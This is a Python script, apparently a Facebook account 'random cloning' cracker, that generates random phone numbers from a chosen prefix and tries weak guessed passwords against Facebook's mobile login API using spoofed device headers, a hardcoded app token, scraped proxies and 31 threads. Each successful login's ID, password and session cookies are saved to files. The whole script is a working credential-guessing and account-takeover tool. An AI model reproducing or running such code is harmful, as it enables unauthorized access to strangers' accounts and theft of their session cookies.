import os,random
import sys,time,uuid
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests,bs4,mechanize,httpx
    import rich,json,subprocess,random,string
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
except ModuleNotFoundError:
    print('\033[1;32mINSTALLING MISSING MODULE....')
    os.system('pip install requests rich')
    os.system('pip install mechanize')
    os.system('pip install bs4 httpx')
loop,ok,bou = 0,[],[]
cok,plist = [],[]
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
 prox=open('.prox.txt','r').read().splitlines()
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
A = '\x1b[1;97m' 
R = '\x1b[38;5;196m'
Y = '\033[1;33m'
G = '\x1b[38;5;48m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
T = '\33[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'
C1  =  '\x1b[38;5;1m'
C2  =  '\x1b[38;5;2m'
C3  =  '\x1b[38;5;3m'
C4  =  '\x1b[38;5;4m'
C5  =  '\x1b[38;5;5m'
X6  =  '\x1b[38;5;6m'
X7  =  '\x1b[38;5;7m'
X8  =  '\x1b[38;5;8m'
X9  =  '\x1b[38;5;9m'
X10  =  '\x1b[38;5;10m'
X11  =  '\x1b[38;5;11m'
X12  =  '\x1b[38;5;12m'
X13  =  '\x1b[38;5;13m'
X14  =  '\x1b[38;5;14m'
X15  =  '\x1b[38;5;15m'
X16  =  '\x1b[38;5;16m'
X17  =  '\x1b[38;5;136m'
def linex():
    print(f'\x1b[1;96m────────────────────────────────────────────')
def clear():
        os.system(f'clear')
        print(logo)
logo=(f"""
  \x1b[1;97m██████ \x1b[1;92m ███████ \x1b[1;97m███    ██    \x1b[1;91m ██\x1b[1;93m  ██████  
  \x1b[1;97m██   ██\x1b[1;92m ██    \x1b[1;97m  ████   ██   \x1b[1;91m ███\x1b[1;93m ██  ████ 
  \x1b[1;97m██████  \x1b[1;92m█████ \x1b[1;97m  ██ ██  ██\x1b[1;92m ███ \x1b[1;91m██\x1b[1;93m ██ ██ ██ 
  \x1b[1;97m██   ██ \x1b[1;92m██    \x1b[1;97m  ██  ██ ██     \x1b[1;91m██ \x1b[1;93m████  ██ 
  \x1b[1;97m██████ \x1b[1;92m ███████ \x1b[1;97m██   ████    \x1b[1;91m ██ \x1b[1;93m ██████
\x1b[1;96m────────────────────────────────────────────
\x1b[1;91m(\x1b[1;92m☂\x1b[1;91m)\x1b[1;92m DEVLOPER  \x1b[1;91m=  \x1b[1;92mTAMIM AHMED             
\x1b[1;96m────────────────────────────────────────────
\x1b[1;91m(\x1b[1;92m☂\x1b[1;91m)\x1b[1;92m TOOLS     \x1b[1;91m=  \x1b[1;92mRANDOM CLONING
\x1b[1;96m────────────────────────────────────────────
\x1b[1;91m(\x1b[1;92m☂\x1b[1;91m)\x1b[1;92m 𝐕𝐄𝐑𝐒𝐈𝐎𝐍   \x1b[1;91m=  \x1b[1;93mV/0-0.1   \x1b[1;91m×(\x1b[1;97mPERSONAL\x1b[1;91m)×   
\x1b[1;96m────────────────────────────────────────────""")
def Main():
        clear()
        print(f'\x1b[1;91m(\x1b[1;92m1\x1b[1;91m)\x1b[1;92m 𝐑𝐀𝐍𝐃𝐎𝐌 𝐂𝐑𝐀𝐂𝐊')
        print(f'\x1b[1;91m(\x1b[1;92m0\x1b[1;91m)\x1b[1;92m EXIT TERMINAL');linex()
        sex =input(f"\x1b[1;91m(\x1b[1;92m☂\x1b[1;91m)\x1b[1;92m 𝐂𝐇𝐎𝐎𝐒𝐄 \x1b[1;97m>\x1b[1;90m>\x1b[1;97m>\x1b[1;92m ")
        if sex in ["1","A"]:
            BD2M()
        if sex in [" 0", "B"]:
            exit(f"\x1b[1;91m(\x1b[1;92m1\x1b[1;91m)\x1b[1;92m TERMINAL EXIT DONE " )
        else:
            exit()
def BD2M():
    user=[]
    clear()
    print(f'\x1b[1;91m(\x1b[1;92m☂\x1b[1;91m)\x1b[1;92m 𝐄𝐗𝐀𝐌𝐏𝐋𝐄 : 017 | 018 | 019 | 016');linex()
    code = input(f'\x1b[1;91m(\x1b[1;92m☂\x1b[1;91m)\x1b[1;92m 𝐂𝐇𝐎𝐎𝐒𝐄 \x1b[1;97m>\x1b[1;90m>\x1b[1;97m>\x1b[1;92m ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    clear()
    print(f'\x1b[1;91m(\x1b[1;92m☂\x1b[1;91m)\x1b[1;92m 𝐄𝐗𝐀𝐌𝐏𝐋𝐄 : 2000 | 3000 | 5000 | 10000 ');linex()
    limit = int(input(f'\x1b[1;91m(\x1b[1;92m☂\x1b[1;91m)\x1b[1;92m 𝐂𝐇𝐎𝐎𝐒𝐄 \x1b[1;97m>\x1b[1;90m>\x1b[1;97m>\x1b[1;92m '))
    clear()
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=31) as yaari:
        clear()
        tl = str(len(user))
        print(f'\x1b[1;91m(\x1b[1;92m☂\x1b[1;91m)\x1b[1;92m 𝐘𝐎𝐔𝐑 𝐂𝐎𝐃𝐄 \x1b[1;91m=\x1b[1;97m  {code}')
        print(f'\x1b[1;91m(\x1b[1;92m☂\x1b[1;91m)\x1b[1;92m 𝐓𝐎𝐓𝐀𝐋 𝐈𝐃  \x1b[1;91m=\x1b[1;97m  {tl}');linex()
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'jannat','mimmim','102030','405060','708090']
            yaari.submit(BD2B,uid,pwx,tl)
    print(f'\x1b[1;96m────────────────────────────────────────────')
    print(f'\x1b[1;91m(\x1b[1;92m☂\x1b[1;91m)\x1b[1;92m 𝐂𝐑𝐀𝐂𝐊 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 𝐇𝐀𝐒 𝐁𝐄𝐍𝐍 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄𝐃')
    print(f'\x1b[1;91m(\x1b[1;92m☂\x1b[1;91m)\x1b[1;92m TOTAL OK :\x1b[1;91m {str(len(oks))}')
    print(f'\x1b[1;91m(\x1b[1;92m☂\x1b[1;91m)\x1b[1;92m TOTAL CP :\x1b[1;91m {str(len(cps))}')
    print(f'\x1b[1;96m────────────────────────────────────────────')
    TAMIM= input(f'\x1b[1;91m(\x1b[1;92m☂\x1b[1;91m)\x1b[1;92m PRESS ENTER TO BACK MAIN MENU \x1b[1;97m>\x1b[1;90m>\x1b[1;97m>\x1b[1;92m ')
    if TAMIM =='':
    	Main()
def BD2B(uid,pwx,tl):
    global loop,oks
    xi  =  random.choice([C1,C2,C3,C4,C5,X6,X7,X8,X9,X10,X11,X12,X13,X14,X15,X16,X17])
    sys.stdout.write(f'\r\r\x1b[38;5;9m(%sTAMIM-XD\x1b[38;5;9m)\x1b[38;5;136m>•<\x1b[38;5;9m(\x1b[38;5;14m%s\x1b[38;5;9m)\x1b[38;5;136m>•<\x1b[38;5;9m(\x1b[38;5;11mOK\x1b[38;5;5m:\x1b[38;5;10m%s\x1b[38;5;9m) \033[1;37m'%(xi,loop,len(oks))),
    sys.stdout.flush()
    try:
        for ps in pwx:
            data={'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':uid,
            'password':ps,
            'generate_analytics_claims':'1',
            'community_id':'',
            'cpl':'true','try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password',
            'source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'fr_FR',
            'client_country_code':'FR',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 10; RMX2083 Build/QQ3A.196409.164) [FBAN/FB4A;FBAV/147.0.0.77;FBDM/{density=1.375544893490451,width=870,height=2163};FBLC/ar_AE;FBRV/541629350 ;FBCR/Docomo;FBMF/realme;FBBD/realme;FBPN/com.facebook.lite;FBDV/RMX2083;FBSV/9.2.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
            'Host':'graph.facebook.com',
            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Connection-Type':'WIFI',
            'X-Tigon-Is-Retry':'False',
            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-device-group':'5120',
            'X-FB-Friendly-Name':'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags':'graphservice',
            'X-FB-HTTP-Engine':'Liger',
            'X-FB-Client-IP':'True',
            'X-FB-Server-Cluster':'True',
            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'access_token' in q:
                uid = str(q['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                print(f'\r\r\x1b[38;5;9m(\x1b[38;5;10mTAMIM-XD-OK\x1b[38;5;9m)\x1b[38;5;10m '+uid+ f'\x1b[38;5;136m●\x1b[38;5;10m '+ps)
                print(f'\r\r\x1b[38;5;9m(\x1b[38;5;14mCOOKIE-🌺\x1b[38;5;9m) \x1b[38;5;136m'+coki)
                open('/sdcard/TAMIM-RND-OK.txt','a').write(uid+'|'+ps+'\n')
                open('/sdcard/TAMIM-RND-COKIE.txt','a').write(uid+'|'+ps+'|'+coki+'\n')
                oks.append(uid)
                break
            elif 'www.facebook.com' in q:
                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                print(f'\r\r\x1b[38;5;9m(\x1b[38;5;10mTAMIM-XD-CP\x1b[38;5;9m)\x1b[38;5;10m '+uid+ f'\x1b[38;5;136m●\x1b[38;5;10m '+ps)
                open('/sdcard/TAMIM-XD-CP.txt','a').write(uid+'|'+ps+'\n')
                cps:append(uid)
            else:continue
        loop+=1
    except Exception as e:
        pass
Main()